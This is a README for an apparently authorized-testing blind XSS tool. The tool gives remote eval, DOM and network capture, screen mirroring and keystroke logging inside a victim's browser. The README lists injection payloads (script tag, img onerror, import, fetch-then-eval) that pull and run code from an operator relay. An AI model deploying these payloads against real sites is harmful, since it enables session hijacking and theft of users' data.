# BXConsole

**Blind XSS Monitoring, Inspection & Replay**

A blind XSS payload fires somewhere you will never see: an admin reviewing a
support ticket, a log viewer on an internal network, a back-office tool three
firewalls away. The classic answer is a callback — you get a URL, a user agent,
maybe a screenshot, and then it is over.

BXConsole gives you a debugger instead. One script into the page and you get
Elements, Console, Sources, Network and a live screen mirror for a browser you
cannot reach, on a network you cannot route to. Then it keeps the whole run on
disk, so the session is still there to read after the tab has closed.

```
   victim context                      your relay                     you
┌────────────────────┐            ┌──────────────────┐        ┌──────────────────┐
│  admin panel       │  ws        │  Node + ws       │  ws    │  console UI      │
│  + agent.js        │ ─────────▶ │  sessions/ disk  │ ◀───── │  DevTools layout │
│  (intranet, no     │ ◀───────── │                  │ ─────▶ │                  │
│   route from you)  │   eval     │  blob store      │ events │  live or recorded│
└────────────────────┘            └──────────────────┘        └──────────────────┘
```

Everything crosses one WebSocket the page opens outbound. You never connect to
the target; the target connects to you.

---

## Why not just a callback

A callback tells you the payload fired. It does not tell you what the
application is, what the admin can do, or what the API answered. BXConsole was
built around three things a callback cannot give you:

- **You are not there, and you never will be.** The window may be open for
  eight seconds. Anything you want later has to be taken while it is open —
  so the agent records the DOM from the first tick and pulls the page's own
  scripts and stylesheets in as they load.
- **The page's network is not yours.** Every asset, source file and response
  body is fetched *by the page*, with the page's route and the page's cookies,
  and handed back over the socket. The console never requests the target
  directly — a `localhost` URL in the victim's page means their machine, not
  yours, and loading it yourself would quietly show you the wrong thing.
- **Navigation normally ends everything.** An agent lives in a document; a
  click kills it. BXConsole can host the app inside a frame it owns and
  re-install itself after every navigation, so one run spans the whole flow.

---

## Quick start

Developed on Node 22.

```bash
npm install
npm run build
npm start                 # relay + console on http://localhost:7331
```

Or `npm run dev` for watch mode (console on `:5173`).

Open the console, go to the **Agent** tab, set a session name, copy a payload.
The relay serves the agent from its own public origin, so the snippet carries
no configuration unless you turn something off.

---

## Getting the agent in

The Agent tab generates each of these against your relay's address:

| Form | For |
|---|---|
| **Script tag** | `<script src="https://relay/agent.js"></script>` — in `<head>`, before the app's own scripts |
| **Img tag** | `<img src="x" onerror="…">` — a field that takes HTML but strips `<script>`. Gets past a sanitiser, never past a CSP |
| **Import call** | `import("https://relay/agent.js")` — anywhere the page runs code |
| **Fetch call** | `fetch(…).then(r=>r.text()).then(eval)` — where a console refuses `import()` |
| **Bookmarklet** | For a page you can reach yourself |

The agent is served with its configuration prepended, so `import()` and
bookmarklets carry options the same way a script tag does.

---

## Options

All five are **on** by default. A payload with no parameters is a run with
everything enabled; a parameter means *this run is not the usual one*.

| | What it does | Turn off with |
|---|---|---|
| **Blackbox** | Records the screen from boot, so History can replay any moment of the run | `data-screen="viewer"` |
| **Payloads** | Captures request and response bodies, not just headers and timing | `data-bodies="0"` |
| **Spread** | Follows the run into windows this page opens and the one that opened it | `data-adopt="0"` |
| **Magpie** | Fetches each script, stylesheet and document as the page loads it, so they are still readable once the run has ended | `data-collect="0"` |
| **Nest** | Hosts the app in a frame the agent keeps, so navigating no longer ends the run | `data-frame="off"` |

One more is not a switch: **`data-mark`** sets the token every trace the agent
leaves in the page is named from — the global it hangs its handle on, its
window flags, its two `sessionStorage` keys, the name of the frame it hosts
in. The default is dull on purpose, but a fixed value is still a fixed value,
so set your own per engagement:

```html
<script src="https://relay/agent.js" data-mark="__q7"></script>
```

The one thing it cannot rename is the global the relay prepends the
configuration to, because the mark is read out of it. Nothing else the agent
writes names the tool.

**Nest changes the page it is debugging.** `window.top` is no longer the app,
frame-busting code undoes it, and the address bar keeps the first URL. A page
that refuses to be framed cannot be hosted at all — the agent detects the
refusal, puts the page back as it was, and attaches directly instead.

---

## What you get

Per run: **Elements · Console · Sources · Network · History**, plus a docked
**Screen** mirror you can click and type into.

- **Elements** — live DOM tree, computed and matched styles, edit attributes
  and text
- **Console** — the page's log, plus `eval` in the page's own context with
  lazy object expansion
- **Sources** — the page's scripts and stylesheets, fetched from inside the
  page
- **Network** — requests, headers, bodies, waterfall, HAR export, replay XHR,
  block by URL
- **History** — a timeline of navigations, interactions, console output and
  performance marks, with replay
- **Screen** — DOM mirror, not video. Interact forwards clicks and keystrokes

Outside a run: **Sessions · Webhook · Trash · Agent**.

---

## Before you fire: the Webhook tab

Each way into a page is governed by a different CSP directive, so a payload
that cannot run may still be able to tell you *why*. The Webhook tab issues a
token and gives you a pure-HTML snippet that tries five mechanisms at once:

| Probe | Directive it tests |
|---|---|
| `img` | `img-src` |
| `style` | `style-src` |
| `script` | `script-src` |
| `fetch` | `connect-src` |
| `websocket` | `connect-src` (ws) |

Whatever arrives tells you which directives are open, and the server reads
`Sec-Fetch-Dest` as proof of which mechanism actually delivered it. The tab
also reads the target's framing headers, which is how you know whether **Nest**
can work before you commit to it. Tokens last 24 hours and survive a relay
restart.

`npm run csp-cases` serves seven pages with different policies for trying this
against something that really does block.

---

## One run, many windows

A **session** is a debugging run, not a window. `window.open` copies
`sessionStorage`, so a page that opens another keeps the session id and the new
window joins as a second tab within it. With **Spread** the agent also climbs
`window.opener` into the windows that opened this one, and intercepts
`target="_blank"` so the opener survives.

The console shows those windows as a tab strip inside the one session. Events
carry the window they came from, and asset requests are routed to the window
the mirror is showing — in a cross-origin chain, only that one can read its own
page's files.

---

## After it's over

This is the part a callback has no answer for.

- **Magpie** collected the page's scripts, stylesheets and documents while it
  was open. They are in the blob store, so Sources still opens them.
- **Response bodies** over 2 KB live in the same store, keyed by content hash,
  so an endpoint polled fifty times with the same answer is one copy on disk.
- **The screen recording** replays from any point — keyframes with op batches
  between them, idle gaps skipped.
- **The Network search** says plainly how many stored bodies it has not loaded
  yet, and offers to go and get them, rather than returning "no matches"
  having silently skipped the one place the answer was.

Anything that was never collected says so: *"this file was not kept while the
run was live, and the run has ended, so there is nowhere left to read it
from."*

---

## Storage

```
sessions/
  session-{id}/
    meta.json         the run: name, url, windows, options
    console.ndjson    console.* and error.*
    network.ndjson    network.*  (large bodies replaced by a content hash)
    page.ndjson       page.*
    history.ndjson    interaction.*, perf.*, mark.*, dom.activity
    screen.ndjson     the DOM recording: keyframes and op batches
    files.ndjson      what Magpie collected: url -> hash
    bodies.ndjson     request/response bodies in the store, by hash
  blobs/ab/cd/<sha256>   one copy of every file, shared across runs
  ping-tokens.json       live Webhook tokens
```

Blobs are shared and deleted by mark-and-sweep, so removing a run frees only
what no other run still points at.

---

## Configuration

| Variable | Default | |
|---|---|---|
| `PORT` | `7331` | |
| `HOST` | `0.0.0.0` | |
| `PUBLIC_ORIGIN` | request origin | the address payloads call back to — set this behind a TLS proxy |
| `CONSOLE_ORIGINS` | loopback only | extra origins allowed to open the console socket |
| `SESSION_RETENTION_DAYS` | `0` | `0` keeps recordings forever |
| `ASSET_MAX_BYTES` | 50 MB | per-run budget for collected files and stored bodies |

A target on `https` needs the relay on `https`/`wss` too — put it behind a TLS
proxy and set `PUBLIC_ORIGIN`.

---

## Development

```
packages/
  protocol/   message and value types, path layout, the shared mime rule —
              the contract between the other three
  agent/      injected into the target page; built as an IIFE to /agent.js
  server/     relay: http, ws routing, ndjson persistence, blob store
  console/    the UI (Vite + React + zustand)
examples/
  demo-page/  a target exercising every hook
  chain/      A -> B -> C, for runs that span windows
  csp/        seven policies, for the Webhook tab and the Nest fallback
  stress/     large DOM, large responses
```

```bash
npm test
npm run typecheck
npm run build
```

Logic that needs testing lives in plain `.ts` beside the component that uses
it — the test runner is `node:test` via `tsx` with no bundler, so a test cannot
import a `.tsx`.

---

## Scope and handling

Use this only against systems you are authorized to test. A payload that calls
home from someone's browser is the same act whether or not the engagement
letter exists.

Two things worth knowing before you deploy a relay:

- **The relay is unauthenticated.** Anyone who can reach the port can read
  every recording and evaluate expressions in any live page. Keep it on a
  network you trust, or put authentication in front of it.
- **The payload is not covert.** `data-mark` keeps the tool's name out of the
  page, but the agent still opens a WebSocket to your relay, and the script
  URL is in the DOM. It is built to be found by the people who own the
  application, not hidden from them.
- **Recordings are as sensitive as the sessions they came from.** Keystrokes
  are recorded verbatim, deliberately and without masking, because the input
  is usually the thing being debugged. A recording of an admin panel contains
  whatever the admin typed into it. Treat `sessions/` as engagement data:
  encrypt it, scope access to it, and delete it when the engagement ends —
  `SESSION_RETENTION_DAYS` will do the last part for you.

---

## License

Apache License 2.0 — see [LICENSE](LICENSE) and [NOTICE](NOTICE).

Permissive on purpose: this is meant to be vendored into a team's own
toolchain and changed per engagement. Apache rather than MIT for the explicit
patent grant and because NOTICE travels with derivatives.
